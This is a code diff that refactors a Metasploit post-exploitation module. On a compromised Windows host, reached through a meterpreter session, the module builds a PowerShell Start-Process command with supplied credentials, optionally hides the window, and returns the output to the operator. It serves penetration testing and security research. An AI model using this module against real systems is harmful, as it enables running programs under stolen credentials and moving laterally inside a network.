@@ -29,62 +29,57 @@ class MetasploitModule < Msf::Post
                 OptBool.new('CHANNELIZE', [true, 'Chanelize output, required for reading output or interracting', true]),
                 OptBool.new('INTERACTIVE', [true, 'Run interactively', true]),
                 OptBool.new('HIDDEN', [true, 'Hide the window', true]),
-                #OptString.new('DUMMY', [false, 'Run in a dummy host process', '']),
             ], self.class)
     end
 
     def run
-        begin
-            raise "Powershell is required" if !have_powershell?
-            #Variable Setup
-            user=datastore['user']
-            pass=datastore['pass']
-            domain = datastore['domain']
-            exe=datastore['exe'].gsub("\\","\\\\\\\\")
-            inter=datastore['interactive']
-            args=datastore['args']
-            path=datastore['path'].gsub("\\","\\\\\\\\")
-            #dummy=datastore['dummy']
-            sessNo=datastore['session']
-            channelized = datastore['channelize']
-            hidden = datastore['hidden']
-            #Check if dession si interactive
-            if (!session.interacting and inter)
-                print_error("Interactive mode can only be used in a meterpreter console")
-                print_error("Use 'run post/windows/manage/run_as_psh USER=x PASS=X EXE=X' or SET INTERACTIVE false")
-                raise 'Invalide console'
-            end
-            scr="$pw = convertto-securestring '#{pass}' -asplaintext -force; "
-            scr+="$pp = new-object -typename System.Management.Automation.PSCredential -argumentlist '#{domain}\\\\#{user}',$pw; "
-            scr+="Start-process '#{exe}' -WorkingDirectory '#{path}' -Credential $pp"
-            if args and args!=''
-                scr+=" -argumentlist '#{args}' "
-            end
-            if hidden
-                print_status("Hidden mode may not work on older powershell versions, if it fails, try HIDDEN=false")
-                scr+= " -WindowStyle hidden"
-            end
-            scr=" -c \"#{scr}\""
-            p = client.sys.process.execute("powershell.exe", scr,
-              'Channelized' => channelized,
-              'Desktop'     => false,
-              'Session'     => false,
-              'Hidden'      => true,
-              'Interactive' => inter,
-              'InMemory'    => nil,
-            'UseThreadToken' => false)
-            print_status("Process #{p.pid} created.")
-            print_status("Channel #{p.channel.cid} created.") if (p.channel)
-            if (inter and p.channel)
-                client.console.interact_with_channel(p.channel)
-            elsif p.channel
-                data = p.channel.read()
-                print_line(data) if data
-            end
-            rescue ::Interrupt
-                raise $!
-            rescue ::Exception => e
-                raise e
+        raise "Powershell is required" if !have_powershell?
+        #Variable Setup
+        user = datastore['user']
+        pass = datastore['pass']
+        domain = datastore['domain']
+        exe = datastore['exe'].gsub("\\","\\\\\\\\")
+        inter = datastore['interactive']
+        args = datastore['args']
+        path = datastore['path'].gsub("\\","\\\\\\\\")
+        sessNo = datastore['session']
+        channelized = datastore['channelize']
+        hidden = datastore['hidden']
+        #Check if session si interactive
+        if (!session.interacting and inter)
+            print_error("Interactive mode can only be used in a meterpreter console")
+            print_error("Use 'run post/windows/manage/run_as_psh USER=x PASS=X EXE=X' or 'SET INTERACTIVE false'")
+            raise 'Invalide console'
+        end
+        #Prepare powershell script
+        scr = "$pw = convertto-securestring '#{pass}' -asplaintext -force; "
+        scr << "$pp = new-object -typename System.Management.Automation.PSCredential -argumentlist '#{domain}\\\\#{user}',$pw; "
+        scr << "Start-process '#{exe}' -WorkingDirectory '#{path}' -Credential $pp"
+        if args and args!=''
+            scr << " -argumentlist '#{args}' "
+        end
+        if hidden
+            print_status("Hidden mode may not work on older powershell versions, if it fails, try HIDDEN=false")
+            scr <<  " -WindowStyle hidden"
+        end
+        scr = " -c \"#{scr}\""
+        #Execute script
+        p = client.sys.process.execute("powershell.exe", scr,
+          'Channelized' => channelized,
+          'Desktop'     => false,
+          'Session'     => false,
+          'Hidden'      => true,
+          'Interactive' => inter,
+          'InMemory'    => false,
+        'UseThreadToken' => false)
+        print_status("Process #{p.pid} created.")
+        print_status("Channel #{p.channel.cid} created.") if (p.channel)
+        #Process output
+        if (inter and p.channel)
+            client.console.interact_with_channel(p.channel)
+        elsif p.channel
+            data = p.channel.read()
+            print_line(data) if data
         end
     end
 end
